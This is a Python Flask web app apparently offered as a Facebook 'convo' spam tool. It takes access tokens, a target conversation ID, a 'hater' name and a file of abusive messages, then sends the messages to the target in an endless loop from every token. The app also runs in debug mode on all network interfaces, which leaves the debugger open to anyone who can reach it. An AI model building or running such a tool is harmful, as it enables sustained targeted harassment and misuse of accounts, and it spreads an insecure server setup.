from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
 
app = Flask(__name__)
app.debug = True
 
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
 
stop_events = {}
threads = {}
 
def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)
 
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()
 
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
 
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
 
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
 
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
 
        return f'Task started with ID: {task_id}'
 
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐃𝐄𝐕𝐀 𝐓𝐇𝐀𝐊𝐔𝐑 𝐇𝐄𝐀𝐑</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.postimg.cc/9QNND0jR/20240713-212849.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px white;
      border: none;
      resize: none;
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: none;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">𝐒𝐈𝐍𝐆𝐀𝐋 𝐌𝐔𝐋𝐓𝐈 𝐂𝐎𝐍𝐕𝐎 𝐏𝐀𝐆𝐄</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">𝐓𝐎𝐊𝐀𝐍 𝐎𝐅𝐒𝐀𝐍</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">𝐏𝐄𝐒𝐓 𝐒𝐈𝐍𝐆𝐀𝐋 𝐓𝐎𝐊𝐀𝐍</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">𝐓𝐎𝐊𝐀𝐍 𝐅𝐈𝐋𝐄 𝐂𝐇𝐔𝐒𝐄</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝐄𝐍𝐓𝐀𝐑 𝐇𝐄𝐀𝐓𝐄𝐑 𝐔𝐈𝐃</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝐄𝐍𝐓𝐀𝐑 𝐇𝐄𝐓𝐀𝐑 𝐍𝐀𝐌𝐄</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝐄𝐍𝐓𝐀𝐑 𝐓𝐈𝐌𝐄</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝐆𝐀𝐋𝐈 𝐅𝐈𝐋𝐄 𝐂𝐇𝐔𝐒𝐄</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">𝐒𝐀𝐑𝐕𝐀𝐑 𝐑𝐔𝐍 𝐊𝐀𝐑𝐄</button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">𝐓𝐀𝐒𝐊 𝐈𝐃 𝐃𝐀𝐋𝐎 𝐑𝐎𝐊𝐎</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">𝐒𝐓𝐎𝐏𝐄 𝐃𝐄𝐕𝐀 𝐏𝐀𝐏𝐀</button>
    </form>
  </div>
  <footer class="footer">
    <p>𝟐𝟎𝟐𝟒 𝐂𝐎𝐃𝐄𝐃 𝐁𝐘 𝐀𝐋𝐋 𝐑𝐎𝐖𝐍𝐃𝐄𝐑 𝐃𝐄𝐕𝐀 𝐏𝐀𝐏𝐀 </p>
    <p> </a></p>
    <div class="mb-3">
      <a href="https://wa.me/+917742350051" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> 𝐃𝐄𝐕𝐀 𝐏𝐀𝐏𝐀 𝐊𝐀 𝐖𝐇𝐀𝐓𝐒𝐇𝐀𝐏
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')
 
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
